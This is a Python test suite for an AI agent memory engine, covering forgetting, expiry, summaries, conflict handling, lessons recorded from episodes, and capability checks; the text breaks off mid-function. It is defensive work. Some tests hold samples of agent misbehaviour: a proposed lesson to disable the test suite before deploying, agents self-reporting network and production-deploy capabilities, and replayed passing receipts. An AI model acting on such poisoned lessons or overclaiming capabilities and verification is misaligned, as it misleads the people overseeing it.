def test_reads_present_retention_and_validity_expiry_before_maintenance(engine, clock):
    transient = engine.remember(USER_P, RememberRequest(content="temp note zulu", scope=PROJ_A,
                                                        retention=Retention("transient", clock() + 10))).record
    bounded = engine.remember(USER_P, RememberRequest(content="sprint ends", scope=PROJ_A,
                                                      validity=Validity(None, clock() + 10))).record
    clock.advance(100)
    assert engine.list(USER_P) == []
    assert engine.get(USER_P, transient.id).lifecycle == Lifecycle.EXPIRED
    assert engine.get(USER_P, bounded.id).lifecycle == Lifecycle.STALE
    assert [r.id for r in engine.list(USER_P, lifecycles=(Lifecycle.EXPIRED,))] == [transient.id]
    assert [r.id for r in engine.list(USER_P, lifecycles=(Lifecycle.STALE,))] == [bounded.id]
    assert engine.explain(USER_P, transient.id)["lifecycle_note"]


def test_remember_refuses_a_forgotten_memory_id(engine):
    engine.remember(USER_P, RememberRequest(content="Launch codename is NIGHTJAR", scope=PROJ_A,
                                            memory_id="mstable0001"))
    engine.forget(USER_P, ForgetTarget("memory", "mstable0001"))
    with pytest.raises(ValidationError):
        engine.remember(USER_P, RememberRequest(content="the project is public now", scope=PROJ_A,
                                                memory_id="mstable0001"))


def test_other_process_never_serves_a_forgotten_document_for_a_recreated_id(make_engine):
    a = make_engine()
    b = make_engine()
    a.remember(USER_P, RememberRequest(content="Launch codename is NIGHTJAR", scope=PROJ_A))
    target = a.list(USER_P)[0].id
    assert b.search(USER_P, Query(text="NIGHTJAR")).hits
    a.forget(USER_P, ForgetTarget("memory", target))
    template = a.remember(USER_P, RememberRequest(content="placeholder", scope=PROJ_A)).record
    ctx = a.partition_context(USER_P.partition)
    with ctx.partition.db.write() as conn:  # re-created at revision 1 (e.g. by an older build or import)
        ctx.services.core.write_internal(conn, dataclasses.replace(
            template, id=target, revision=1, content="the project is public now"), change="imported",
            actor=Actor.SYSTEM, expected=None)
    assert b.search(USER_P, Query(text="NIGHTJAR")).hits == ()
    assert [h.record.id for h in b.search(USER_P, Query(text="public")).hits] == [target]


# =========================================================================== summaries and corrections
def _summary(engine, inputs, *, lifecycle=Lifecycle.CANDIDATE):
    ctx = _ctx(engine, USER_P)
    now = ctx.clock()
    with ctx.partition.db.write() as conn:
        base = inputs[0]
        record = dataclasses.replace(
            base, id="msummary0001", revision=1, kind=MemoryKind.SUMMARY, lifecycle=lifecycle,
            content="Code reviews must finish within one day and need two approvals",
            title="Summary", basis=StatementBasis.MODEL_INTERPRETATION,
            sources=tuple(SourceRef(SourceKind.MEMORY, r.id) for r in inputs),
            links=dataclasses.replace(base.links, derived_from=tuple(r.id for r in inputs)),
            retention=Retention("durable", now + 1000 if lifecycle == Lifecycle.CANDIDATE else None),
            subject=None, predicate=None,
            extra={"proposer": "consolidation", "input_revisions": {r.id: r.revision for r in inputs}})
        return ctx.services.core.write_internal(conn, record, change="consolidated", actor=Actor.SYSTEM,
                                                expected=None)


def test_correcting_an_input_retires_its_summaries(engine):
    inputs = [engine.remember(USER_P, RememberRequest(content=t, scope=PROJ_A)).record
              for t in ("Two approvals are required", "Reviews happen within one day")]
    summary = _summary(engine, inputs)
    engine.approve(USER_P, summary.id, expected_revision=1)
    engine.correct(USER_P, inputs[0].id, Correction(content="Only one approval is required"),
                   expected_revision=inputs[0].revision)
    assert engine.get(USER_P, summary.id).lifecycle == Lifecycle.STALE
    text = engine.build_context(USER_P, ContextRequest(token_allowance=4000)).text
    assert "two approvals" not in text


def test_a_summary_whose_inputs_changed_cannot_be_approved(engine):
    inputs = [engine.remember(USER_P, RememberRequest(content=t, scope=PROJ_A)).record
              for t in ("Two approvals are required", "Reviews happen within one day")]
    summary = _summary(engine, inputs)
    engine.set_pinned(USER_P, inputs[1].id, True, expected_revision=inputs[1].revision)  # any revision change
    with pytest.raises(StaleDerivation):
        engine.approve(USER_P, summary.id, expected_revision=1)
    engine.correct(USER_P, inputs[0].id, Correction(content="Only one approval is required"),
                   expected_revision=inputs[0].revision)
    assert engine.get(USER_P, summary.id).lifecycle == Lifecycle.EXPIRED


def test_superseding_an_input_retires_its_summaries(engine):
    inputs = [engine.remember(USER_P, RememberRequest(content=t, scope=PROJ_A)).record
              for t in ("Two approvals are required", "Reviews happen within one day")]
    summary = _summary(engine, inputs)
    engine.approve(USER_P, summary.id, expected_revision=1)
    replacement = engine.remember(USER_P, RememberRequest(content="Reviews within three days", scope=PROJ_A)).record
    engine.supersede(USER_P, inputs[1].id, replacement.id, expected_revision=inputs[1].revision)
    assert engine.get(USER_P, summary.id).lifecycle == Lifecycle.STALE


def _fact(engine, content, **kw):
    return engine.remember(USER_P, RememberRequest(content=content, scope=PROJ_A, subject="deploy",
                                                   predicate="target", **kw)).record


@pytest.mark.parametrize("policy", ["omit", "annotate"])
def test_a_correction_that_creates_a_conflict_is_seen_by_context(engine, policy):
    a = _fact(engine, "The deploy target is staging-1")
    b = _fact(engine, "The deploy target is staging-1 ")
    corrected = engine.correct(USER_P, b.id, Correction(content="The deploy target is prod-2"),
                               expected_revision=b.revision)
    assert corrected.conflicts == (a.id,) and corrected.record.links.conflicts_with == (a.id,)
    packet = engine.build_context(USER_P, ContextRequest(token_allowance=4000, conflict_policy=policy))
    assert packet.conflicts == (tuple(sorted((a.id, b.id))),)
    if policy == "omit":
        assert packet.items == ()
    else:
        assert "conflict: disagrees with" in packet.text


@pytest.mark.parametrize("policy", ["omit", "annotate"])
def test_a_correction_that_resolves_a_conflict_is_seen_by_context(engine, policy):
    a = _fact(engine, "The deploy target is staging-1")
    b = _fact(engine, "The deploy target is prod-2")
    assert b.links.conflicts_with == (a.id,)
    corrected = engine.correct(USER_P, b.id, Correction(content="The deploy target is staging-1."),
                               expected_revision=b.revision).record
    assert corrected.links.conflicts_with == ()
    packet = engine.build_context(USER_P, ContextRequest(token_allowance=4000, conflict_policy=policy))
    assert packet.conflicts == () and "conflict:" not in packet.text
    assert {i.record_id for i in packet.items} & {a.id, b.id}  # agreeing records are served again
    assert not any(o.reason == "conflict" for o in packet.omissions)
    assert all(hit.conflicts == () for hit in engine.search(USER_P, Query(text="deploy target")).hits)


# =========================================================================== context packets
def test_context_packets_do_not_name_out_of_grant_memory_evidence(engine):
    wide = access_for(projects=("P1", "P2"))
    narrow = access_for(projects=("P1",))
    secret = engine.remember(wide, RememberRequest(content="secret", scope=P2)).record
    engine.remember(wide, RememberRequest(content="the build uses ninja", scope=P1,
                                          sources=(SourceRef(SourceKind.MEMORY, secret.id),)))
    leaked = f"memory:{secret.id}"
    packet = engine.build_context(narrow, ContextRequest(token_allowance=4000))
    assert packet.items and all(leaked not in item.sources for item in packet.items)
    explained = engine.explain_context(narrow, packet.receipt_id)
    assert all(leaked not in item["sources"] for item in explained["items"])
    wide_packet = engine.build_context(wide, ContextRequest(token_allowance=4000))
    assert any(leaked in item.sources for item in wide_packet.items)


@pytest.mark.parametrize("policy", ["omit", "annotate"])
@pytest.mark.parametrize("path", ["approve", "remember"])
def test_revalidation_sees_a_conflict_approved_after_compilation(engine, policy, path):
    a = engine.remember(USER_P, RememberRequest(content="deploy target is staging-1", scope=PROJ_A,
                                                subject="deploy", predicate="target")).record
    packet = engine.build_context(USER_P, ContextRequest(token_allowance=4000, conflict_policy=policy))
    assert [i.record_id for i in packet.items] == [a.id]
    if path == "approve":
        c = engine.propose(USER_P, CandidateProposal(content="deploy target is prod-2", scope=PROJ_A, sources=(DOC1,),
                                                     subject="deploy", predicate="target")).record
        engine.approve(USER_P, c.id, expected_revision=1, resolution="keep_both")
    else:
        c = engine.remember(USER_P, RememberRequest(content="deploy target is prod-2", scope=PROJ_A,
                                                    subject="deploy", predicate="target")).record
    fresh = engine.revalidate_context(USER_P, packet)
    assert fresh is not packet
    if policy == "omit":
        assert fresh.items == ()
    else:
        assert fresh.conflicts == (tuple(sorted((a.id, c.id))),)


def test_historical_replay_omits_records_whose_retention_has_ended(engine, clock):
    past = clock()
    record = engine.remember(USER_P, RememberRequest(content="zulu transient", scope=PROJ_A,
                                                     retention=Retention("transient", past + 100))).record
    replay_early = engine.build_context(USER_P, ContextRequest(token_allowance=4000, at_time=past + 50))
    assert record.id in {i.record_id for i in replay_early.items}
    clock.advance(1000)
    assert engine.revalidate_context(USER_P, replay_early) is not replay_early
    replay = engine.build_context(USER_P, ContextRequest(token_allowance=4000, at_time=past + 50))
    assert record.id not in {i.record_id for i in replay.items}
    assert (record.id, "expired") in {(o.record_id, o.reason) for o in replay.omissions}
    engine.maintain(USER_P)
    after = engine.build_context(USER_P, ContextRequest(token_allowance=4000, at_time=past + 50))
    assert record.id not in {i.record_id for i in after.items}


def test_cached_replay_expires_with_the_retention_it_depends_on(engine, clock):
    past = clock()
    record = engine.remember(USER_P, RememberRequest(content="zulu transient", scope=PROJ_A,
                                                     retention=Retention("transient", past + 100))).record
    request = ContextRequest(token_allowance=4000, at_time=past + 50)
    first = engine.build_context(USER_P, request)
    assert record.id in {i.record_id for i in first.items}
    clock.advance(500)
    second = engine.build_context(USER_P, request)
    assert second.costs["cache"] == "miss" and record.id not in {i.record_id for i in second.items}


def test_degraded_packets_are_not_cached(engine, monkeypatch):
    from locus_memory.context.compiler import R_RANK_FAILED

    engine.remember(USER_P, RememberRequest(content="decision one", scope=PROJ_A, kind=MemoryKind.DECISION))
    engine.remember(USER_P, RememberRequest(content="decision two", scope=PROJ_A, kind=MemoryKind.DECISION))
    retrieval = engine.services(USER_P).retrieval
    original = retrieval.rank
    calls = {"n": 0}

    def flaky(*args, **kwargs):
        calls["n"] += 1
        if calls["n"] == 1:
            raise RuntimeError("transient ranker outage")
        return original(*args, **kwargs)

    monkeypatch.setattr(retrieval, "rank", functools.wraps(original)(flaky))
    request = ContextRequest(token_allowance=4000, query="decision")
    first = engine.build_context(USER_P, request)
    assert R_RANK_FAILED in first.coverage.partial_reasons
    second = engine.build_context(USER_P, request)
    assert second.costs["cache"] == "miss" and calls["n"] == 2
    assert R_RANK_FAILED not in second.coverage.partial_reasons
    assert engine.build_context(USER_P, request).costs["cache"] == "hit"  # a complete packet still caches


def test_degraded_packet_is_recompiled_on_revalidation(engine, monkeypatch):
    engine.remember(USER_P, RememberRequest(content="decision one", scope=PROJ_A, kind=MemoryKind.DECISION))
    retrieval = engine.services(USER_P).retrieval
    original = retrieval.rank
    state = {"fail": True}

    def flaky(*args, **kwargs):
        if state["fail"]:
            raise RuntimeError("transient ranker outage")
        return original(*args, **kwargs)

    monkeypatch.setattr(retrieval, "rank", functools.wraps(original)(flaky))
    degraded = engine.build_context(USER_P, ContextRequest(token_allowance=4000, query="decision"))
    state["fail"] = False
    fresh = engine.revalidate_context(USER_P, degraded)
    assert fresh is not degraded and fresh.status == ResultStatus.COMPLETE


# =========================================================================== provider withdrawal
def _synced_p2(make_engine, clock, count=5):
    from locus_memory.host import HostCapabilities
    from locus_memory.providers.base import ConsentGrant, StaticConsentPolicy
    from locus_memory.providers.fake import FakeExternalMemory

    ext = FakeExternalMemory("ext", clock=clock)
    consent = StaticConsentPolicy([ConsentGrant(provider="ext", scope=None, data_classes=frozenset({"memory_text"}),
                                                granted_at=clock() - 1)])
    engine = make_engine(host=HostCapabilities(clock=clock, providers={"ext": ext}, consent=consent))
    p2 = access_for(projects=("P2",))
    for i in range(count):
        engine.remember(p2, RememberRequest(content=f"p2 item {i}", scope=P2))
    assert engine.services(p2).providers.sync_external(p2, "ext")["confirmed"] == count
    return engine, ext


def test_withdraw_external_requires_a_user_or_host_and_respects_grants(make_engine, clock):
    engine, ext = _synced_p2(make_engine, clock)
    agent = access_for(actor=Actor.AGENT, projects=("P1",), operations={Operation.READ, Operation.FORGET})
    user_p1 = access_for(projects=("P1",), operations={Operation.READ, Operation.FORGET})
    hub = engine.services(agent).providers
    with pytest.raises(AccessDenied):
        hub.withdraw_external(agent, "ext")
    with pytest.raises(AccessDenied):
        hub.withdraw_external(user_p1, "ext")
    admin = access_for(projects=("P1",))
    assert len(engine.services(admin).providers.process_outbox(admin)["confirmed"]) == 0
    assert len(ext.items) == 5
    user_p2 = access_for(projects=("P2",), operations={Operation.READ, Operation.FORGET})
    queued = hub.withdraw_external(user_p2, "ext")
    assert len(queued) == 5
    assert hub.withdraw_external(user_p2, "ext") == []  # only what this call queued
    assert len(engine.services(admin).providers.process_outbox(admin)["confirmed"]) == 5 and ext.items == {}


def test_admin_may_withdraw_everything(make_engine, clock):
    engine, ext = _synced_p2(make_engine, clock, count=2)
    admin = access_for(projects=("P1",))
    assert len(engine.services(admin).providers.withdraw_external(admin, "ext")) == 2


# =========================================================================== episodes, lessons, procedures
from locus_memory.host import HostCapabilities  # noqa: E402
from locus_memory.learning.episodes import attempt_source_ref  # noqa: E402
from locus_memory.models import (  # noqa: E402
    EpisodeOutcome,
    EpisodeReport,
    ProcedureState,
    VerificationRef,
    VerificationResult,
    VerifiedCheck,
)


class _Authority:
    def __init__(self) -> None:
        self.results: dict[str, VerificationResult] = {}

    def add(self, receipt_id, *, task_ref=None, passed=True, issued_at=1.0, capabilities=None):
        extra = {"capabilities": capabilities} if capabilities is not None else {}
        self.results[receipt_id] = VerificationResult(
            receipt_id=receipt_id, trusted=True, task_ref=task_ref, issued_at=issued_at,
            checks=(VerifiedCheck("pytest", passed, True),), **extra)

    def resolve(self, receipt_id):
        return self.results.get(receipt_id)


@pytest.fixture
def authority():
    return _Authority()


@pytest.fixture
def leng(make_engine, clock, authority):
    return make_engine(host=HostCapabilities(clock=clock, verification=authority))


def _report(episode_id, task, attempt="a1", *, receipts=(), claimed="verified_success", **kwargs):
    return EpisodeReport(episode_id=episode_id, task_ref=task, attempt_ref=attempt,
                         objective=kwargs.pop("objective", f"work on {task}"), scope=PROJ_A,
                         verification=tuple(VerificationRef(r) for r in receipts), claimed_outcome=claimed,
                         **kwargs)


def _lesson_ids(receipt):
    return list(receipt.details["lesson_candidates"])


def test_forgetting_the_last_attempt_cascades_to_its_lessons(leng, authority):
    authority.add("rcpt-1", task_ref="task-1")
    episode, receipt = leng.record_episode(USER_P, _report("ep-1", "task-1", receipts=("rcpt-1",),
                                                           proposed_lessons=("Seed the random generator",)))
    lesson = _lesson_ids(receipt)[0]
    leng.forget(USER_P, ForgetTarget("source", "task_attempt:" + attempt_source_ref("task-1", "a1")))
    with pytest.raises(NotFound):
        leng.get_episode(USER_P, "ep-1")
    with pytest.raises(NotFound):
        leng.get(USER_P, lesson)
    with raw_db(db_path(leng.root, USER_P)) as conn:
        assert conn.execute("SELECT COUNT(*) FROM derivations").fetchone()[0] == 0


def test_candidates_citing_a_forgotten_episode_are_removed_and_refused(make_engine, clock, authority):
    engine = make_engine(host=HostCapabilities(clock=clock, verification=authority))
    episode, _ = engine.record_episode(USER_P, _report("ep-1", "task-1"))
    candidate = engine.propose(AGENT_P, CandidateProposal(content="from the episode", scope=PROJ_A,
                                                          sources=(SourceRef(SourceKind.EPISODE, "ep-1"),))).record
    engine.forget(USER_P, ForgetTarget("memory", episode.record_id))
    with pytest.raises(NotFound):
        engine.get(USER_P, candidate.id)
    ctx = engine.partition_context(USER_P.partition)
    with ctx.partition.db.read() as conn:
        late = dataclasses.replace(candidate, id="mlatecandidate1")
        assert ctx.services.forgetting.blocked_reason(conn, late) is not None  # survives reconcile/replay
    engine.close()
    reopened = make_engine(host=HostCapabilities(clock=clock, verification=authority))
    with pytest.raises(NotFound):
        reopened.get(USER_P, candidate.id)


def test_alias_spellings_of_a_task_attempt_share_tombstones_and_suppressions(leng, authority):
    leng.record_episode(USER_P, _report("ep-1", "task-1", "a1"))
    leng.record_episode(USER_P, _report("ep-1", "task-1", "a2"))
    raw = SourceRef(SourceKind.TASK_ATTEMPT, "a1", locator={"task_ref": "task-1"})
    agent = access_for(actor=Actor.AGENT, projects=("proj-a",), operations={Operation.READ, Operation.PROPOSE})
    candidate = leng.propose(agent, CandidateProposal(content="raw spelling", sources=(raw,), scope=PROJ_A)).record
    assert candidate.sources[0].ref == attempt_source_ref("task-1", "a1")  # stored canonically
    leng.forget(USER_P, ForgetTarget("source", "task_attempt:" + attempt_source_ref("task-1", "a1")))
    with pytest.raises(NotFound):
        leng.get(USER_P, candidate.id)
    canonical = SourceRef(SourceKind.TASK_ATTEMPT, attempt_source_ref("task-1", "a2"))
    forgotten = leng.propose(USER_P, CandidateProposal(content="suppressed lesson", sources=(canonical,),
                                                       scope=PROJ_A)).record
    leng.forget(USER_P, ForgetTarget("memory", forgotten.id))
    with pytest.raises(SuppressedError):
        leng.propose(agent, CandidateProposal(content="suppressed lesson", scope=PROJ_A, sources=(
            SourceRef(SourceKind.TASK_ATTEMPT, "a2", locator={"task_ref": "task-1"}),)))


def test_git_object_ids_are_canonical_in_every_spelling():
    from locus_memory.models import canonical_identity, canonical_source

    upper = SourceRef(SourceKind.BLOB_RANGE, "repo-a:FC72A5C1DEADBEEF")
    assert canonical_source(upper).ref == "repo-a:fc72a5c1deadbeef"
    assert canonical_identity("blob_range:repo-a:FC72A5C1DEADBEEF") == "blob_range:repo-a:fc72a5c1deadbeef"
    assert canonical_identity("commit:repo-a:ABC123") == "commit:repo-a:abc123"
    assert canonical_identity("document:Doc-1") == "document:Doc-1"


def test_forgetting_one_attempt_forgets_its_narrative_lessons_vectors_and_replica(make_engine, clock, authority):
    from locus_memory.providers.base import ConsentGrant, StaticConsentPolicy
    from locus_memory.providers.fake import FakeEmbeddingProvider, FakeExternalMemory

    ext = FakeExternalMemory("ext", clock=clock)
    embed = FakeEmbeddingProvider("local-embed")
    consent = StaticConsentPolicy([ConsentGrant(provider="ext", scope=None, data_classes=frozenset({"memory_text"}),
                                                granted_at=clock() - 1)])
    engine = make_engine(host=HostCapabilities(clock=clock, verification=authority, consent=consent,
                                               providers={"ext": ext, "local-embed": embed}))
    engine.record_episode(USER_P, _report("ep-1", "task-1", "a1", failure_modes=("a1 compile error",),
                                          proposed_lessons=("keep the a1 lesson",)))
    _, second = engine.record_episode(USER_P, _report(
        "ep-1", "task-1", "a2", objective="A2OBJECTIVE retry with zeta", approach="A2APPROACH bisect zeta",
        failure_modes=("A2ONLY flaky socket timeout",), proposed_lessons=("always pin the zeta toolchain",),
        affected_paths=("src/a2only/module.py",)))
    a2_lesson = _lesson_ids(second)[0]
    episode = engine.get_episode(USER_P, "ep-1")
    engine.search(USER_P, Query(text="zeta toolchain"))  # computes vectors of the a2-bearing revision
    hub = engine.services(USER_P).providers
    hub.semantic_scores(USER_P, "zeta", engine.list(USER_P, kinds=(MemoryKind.EPISODE,)))
    assert hub.sync_external(USER_P, "ext")["confirmed"] >= 1
    receipt = engine.forget(USER_P, ForgetTarget("source", "task_attempt:" + attempt_source_ref("task-1", "a2")))
    after = engine.get_episode(USER_P, "ep-1")
    record = engine.get(USER_P, episode.record_id)
    assert after.attempts == ("a1",)
    for text in ("A2OBJECTIVE", "A2APPROACH", "A2ONLY", "a2only", "zeta"):
        assert text not in record.content and text not in json_dumps(after.to_dict())
    assert after.failure_modes == ("a1 compile error",)
    with pytest.raises(NotFound):
        engine.get(USER_P, a2_lesson)
    with raw_db(db_path(engine.root, USER_P)) as conn:
        stale = conn.execute("SELECT COUNT(*) FROM embeddings e JOIN records r ON r.id=e.record_id"
                             " WHERE e.revision < r.revision").fetchone()[0]
    assert stale == 0
    hub.process_outbox(USER_P)
    assert not any("A2ONLY" in json_dumps(item) for item in ext.items.values())
    assert receipt.deleted.get("episodes_updated") or receipt.retained_by_policy


def json_dumps(value):
    import json

    return json.dumps(value, default=str)


def test_lessons_and_receipt_commit_with_the_episode(leng, authority, monkeypatch):
    from locus_memory.core import CoreService

    original = CoreService.propose_in
    calls = {"n": 0}

    @functools.wraps(original)
    def flaky(self, *args, **kwargs):
        calls["n"] += 1
        if calls["n"] == 1:
            raise Contention("busy")
        return original(self, *args, **kwargs)

    monkeypatch.setattr(CoreService, "propose_in", flaky)
    report = _report("ep-1", "task-1", proposed_lessons=("pin node in CI",))
    with pytest.raises(Contention):
        leng.record_episode(USER_P, report)
    with pytest.raises(NotFound):  # nothing was committed without its lessons and receipt
        leng.get_episode(USER_P, "ep-1")
    episode, receipt = leng.record_episode(USER_P, report)
    assert len(_lesson_ids(receipt)) == 1
    assert leng.get(USER_P, _lesson_ids(receipt)[0]).lifecycle == Lifecycle.CANDIDATE
    with raw_db(db_path(leng.root, USER_P)) as conn:
        operations = [r[0] for r in conn.execute("SELECT operation FROM receipts")]
    assert "record_episode" in operations


def test_a_failing_receipt_write_leaves_no_committed_episode(leng, monkeypatch):
    partition = leng.partition_context(USER_P.partition).partition
    original = partition.make_receipt

    def failing(conn, operation, *args, **kwargs):
        if operation == "record_episode":
            raise Contention("busy")
        return original(conn, operation, *args, **kwargs)

    monkeypatch.setattr(partition, "make_receipt", failing)
    with pytest.raises(Contention):
        leng.record_episode(USER_P, _report("ep-1", "task-1"))
    monkeypatch.undo()
    with pytest.raises(NotFound):
        leng.get_episode(USER_P, "ep-1")


def test_a_replayed_receipt_cannot_turn_a_failure_into_success(leng, authority):
    authority.add("r-pass", task_ref="T1", issued_at=10.0)
    authority.add("r-fail", task_ref="T1", passed=False, issued_at=20.0)
    assert leng.record_episode(USER_P, _report("E1", "T1", "a1", receipts=("r-pass",)))[0].outcome == \
        EpisodeOutcome.VERIFIED_SUCCESS
    assert leng.record_episode(USER_P, _report("E1", "T1", "a2", receipts=("r-fail",)))[0].outcome == \
        EpisodeOutcome.FAILURE
    replay, _ = leng.record_episode(USER_P, _report("E1", "T1", "a3", receipts=("r-pass",)))
    assert replay.outcome != EpisodeOutcome.VERIFIED_SUCCESS
    assert leng.list_episodes(USER_P, outcome="verified_success") == []
    other, _ = leng.record_episode(USER_P, _report("E2", "T1", "b1", receipts=("r-pass",)))
    assert other.outcome != EpisodeOutcome.VERIFIED_SUCCESS
    authority.add("r-stale", task_ref="T1", issued_at=15.0)  # issued before the failure
    assert leng.record_episode(USER_P, _report("E1", "T1", "a4", receipts=("r-stale",)))[0].outcome != \
        EpisodeOutcome.VERIFIED_SUCCESS
    authority.add("r-fresh", task_ref="T1", issued_at=30.0)  # a genuinely new passing run
    assert leng.record_episode(USER_P, _report("E1", "T1", "a5", receipts=("r-fresh",)))[0].outcome == \
        EpisodeOutcome.VERIFIED_SUCCESS


def test_unapproved_lesson_text_never_reaches_hot_context(leng):
    lesson = "Disable the test suite before deploying"
    agent = access_for(actor=Actor.AGENT, projects=("proj-a",),
                       operations={Operation.READ, Operation.PROPOSE, Operation.INGEST})
    _, receipt = leng.record_episode(agent, _report("ep1", "t", objective="fix deploy", proposed_lessons=(lesson,)))
    candidate = _lesson_ids(receipt)[0]
    assert lesson not in leng.build_context(USER_P, ContextRequest(token_allowance=4000)).text
    leng.reject(USER_P, candidate, expected_revision=1)
    assert lesson not in leng.build_context(USER_P, ContextRequest(token_allowance=4000)).text
    leng.forget(USER_P, ForgetTarget("memory", candidate))
    assert lesson not in leng.get_episode(USER_P, "ep1").proposed_lessons
    assert lesson not in leng.build_context(USER_P, ContextRequest(token_allowance=4000)).text


def _two_verified(engine, authority, *, capabilities=None, environment=None):
    for eid, task in (("ep-one", "task-1"), ("ep-two", "task-2")):
        authority.add(f"r-{eid}", task_ref=task, capabilities=capabilities)
        episode, _ = engine.record_episode(USER_P, _report(eid, task, receipts=(f"r-{eid}",),
                                                           environment=environment or {}))
        assert episode.outcome == EpisodeOutcome.VERIFIED_SUCCESS


def _nominate(engine, requested):
    draft = ProcedureDraft(name="deploy", purpose="Deploy safely", applicability="When deploying",
                           steps=("Run the test suite", "Tag the release"), scope=PROJ_A,
                           evidence_episode_ids=("ep-one", "ep-two"), requested_capabilities=requested)
    return engine.nominate_procedure(USER_P, draft)[0]


def test_agent_reported_capabilities_never_clear_a_capability_request(leng, authority):
    dangerous = ("network_egress", "deploy_production", "write_outside_repository")
    _two_verified(leng, authority, environment={"capabilities": list(dangerous)})
    procedure = _nominate(leng, dangerous)
    assert procedure.state == ProcedureState.UNSAFE
    assert "capability_unverified@requested_capabilities" in procedure.safety_findings


def test_host_attested_capabilities_bound_a_capability_request(leng, authority):
    _two_verified(leng, authority, capabilities=("run_tests",))
    assert _nominate(leng, ("run_tests",)).state == ProcedureState.CANDIDATE
    escalated = _nominate(leng, ("run_tests", "network_egress"))
    assert "capability_escalation@requested_capabilities" in escalated.safety_findings


# =========================================================================== consolidation receipts / fence
def test_maintain_and_consolidate_leave_receipts(make_engine, clock):
    from locus_memory.providers.base import ConsentGrant, StaticConsentPolicy
    from locus_memory.providers.fake import FakeSummarizer

    fake = FakeSummarizer(egress=False, clock=clock)
    engine = make_engine(host=HostCapabilities(clock=clock, providers={fake.descriptor.name: fake},
                                               consent=StaticConsentPolicy([ConsentGrant(
                                                   provider=fake.descriptor.name, scope=PROJ_A,
                                                   granted_at=clock() - 1)])))
    for text in ("Reviews happen within one day", "Two approvals are required", "Authors merge their own PRs"):
        engine.remember(USER_P, RememberRequest(content=text, scope=PROJ_A))
    result = engine.consolidate(USER_P, {"summarize": True})
    assert result["receipt_id"]
    candidate = engine.propose(USER_P, CandidateProposal(content="soon expired", scope=PROJ_A, sources=(DOC1,))).record
    clock.advance(31 * 86_400)
    maintained = engine.maintain(USER_P)
    assert maintained["expired"] >= 1 and maintained["receipt_id"]
    with raw_db(db_path(engine.root, USER_P)) as conn:
        operations = {r[0] for r in conn.execute("SELECT operation FROM receipts")}
    assert {"consolidate", "maintain"} <= operations
    receipt = engine.services(USER_P).core.p.load_receipt(engine.services(USER_P).core.p.db.conn,
                                                         maintained["receipt_id"])
    assert candidate.id in receipt["record_ids"]
    if result["summaries"]:
        consolidated = engine.services(USER_P).core.p.load_receipt(
            engine.services(USER_P).core.p.db.conn, result["receipt_id"])
        assert set(result["summaries"]) <= set(consolidated["record_ids"])


# =========================================================================== repository exclusions
GIT = shutil.which("git")


def _git(cwd, *args):
    import os
    import subprocess

    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
    env.update({"GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_NOSYSTEM": "1", "LC_ALL": "C"})
    subprocess.run([GIT, "-c", "user.name=T", "-c", "user.email=t@example.invalid", "-c", "init.defaultBranch=main",
                    "-c", "commit.gpgsign=false", "-c", "core.hooksPath=/dev/null", *args],
                   cwd=cwd, env=env, check=True, capture_output=True, text=True)


@pytest.mark.skipif(GIT is None, reason="git is required")
def test_observations_of_paths_excluded_later_are_never_listed_searched_or_injected(make_engine, clock, tmp_path,
                                                                                    root, keys):
    allowed = tmp_path / "allowed"
    repo = allowed / "repo"
    repo.mkdir(parents=True)
    _git(repo, "init", "-q", ".")
    (repo / "settings_prod.py").write_text('"""prod db host db-17.internal user=svc_payments"""\nX = 1\n')
    (repo / "app.py").write_text('"""application entry point"""\nY = 2\n')
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "init")
    access = access_for(repositories=("r1",), projects=("proj-a",))
    first = make_engine(host=HostCapabilities(clock=clock, allowed_repository_roots=(allowed,)))
    first.register_repository(access, repo, repository_id="r1")
    first.snapshot_repository(access, "r1")
    assert "settings_prod.py" in [r.extra["path"] for r in first.repository_observations(access, "r1")]
    first.close()
    engine = make_engine(host=HostCapabilities(clock=clock, allowed_repository_roots=(allowed,),
                                               repository_exclude_patterns=["settings_prod.py"]))

    def visible_paths():
        listed = [r.extra.get("path") for r in engine.repository_observations(access, "r1")]
        listed += [r.extra.get("path") for r in engine.repository_observations(access, "r1", current_only=False)]
        listed += [r.extra.get("path") for r in engine.list(access, lifecycles=None,
                                                             kinds=(MemoryKind.REPOSITORY_OBSERVATION,))]
        hits = engine.search(access, Query(text="prod db host", include_stale=True,
                                           lifecycles=(Lifecycle.APPROVED, Lifecycle.STALE))).hits
        listed += [h.record.extra.get("path") for h in hits]
        packet = engine.build_context(access, ContextRequest(token_allowance=4000, query="prod db host",
                                                             repository="r1"))
        return listed, packet.text

    listed, text = visible_paths()
    assert "settings_prod.py" not in listed and "settings_prod" not in text and "db-17" not in text
    engine.snapshot_repository(access, "r1")
    listed, text = visible_paths()
    assert "settings_prod.py" not in listed and "db-17" not in text
    with raw_db(db_path(root, access)) as conn:  # purged, not merely stale
        assert conn.execute("SELECT COUNT(*) FROM repo_observations").fetchone()[0] == 1


# =========================================================================== migrations
import json as _json  # noqa: E402

from locus_memory.compat.legacy_vault import (  # noqa: E402
    LegacyContinuityStore,
    LegacyMemoryVault,
    LegacyWrongKey,
)
from locus_memory.errors import MigrationError, OwnershipFenced  # noqa: E402
from locus_memory.migrations import legacy as legacy_mod  # noqa: E402
from locus_memory.migrations.cutover import Migrator, SimulatedCrash  # noqa: E402
from locus_memory.migrations.state import OwnershipControl  # noqa: E402

FIXTURE = Path(__file__).parent / "fixtures" / "locus_legacy"
EXPECTED = _json.loads((FIXTURE / "expected.json").read_text())
KEY = bytes.fromhex(EXPECTED["key_hex"])
WS, OTHER, AGENT = EXPECTED["workspace"], EXPECTED["other_workspace"], EXPECTED["agent_id"]
IDS = EXPECTED["ids"]
MEMORY_IDS = set(EXPECTED["memories"])


@pytest.fixture
def legacy_db(tmp_path):
    target = tmp_path / "legacy" / "memory.sqlite3"
    target.parent.mkdir()
    shutil.copy(FIXTURE / "memory.sqlite3", target)
    return target


@pytest.fixture
def mapping():
    return legacy_mod.LegacyMapping.from_known({WS: "proj-a", OTHER: "proj-b"}, [AGENT])


@pytest.fixture
def admin():
    return access_for(projects=("proj-a", "proj-b"), agents=(AGENT,), operations=set(Operation))


@pytest.fixture
def control(root):
    ctl = OwnershipControl(root)
    yield ctl
    ctl.close()


@pytest.fixture
def menv(make_engine, control):
    return make_engine(host=HostCapabilities(ownership=control))


def _migrator(engine, control, admin, legacy_db, mapping, tmp_path):
    return Migrator(engine, control, admin, legacy_db, KEY, mapping, work_dir=tmp_path / "migration",
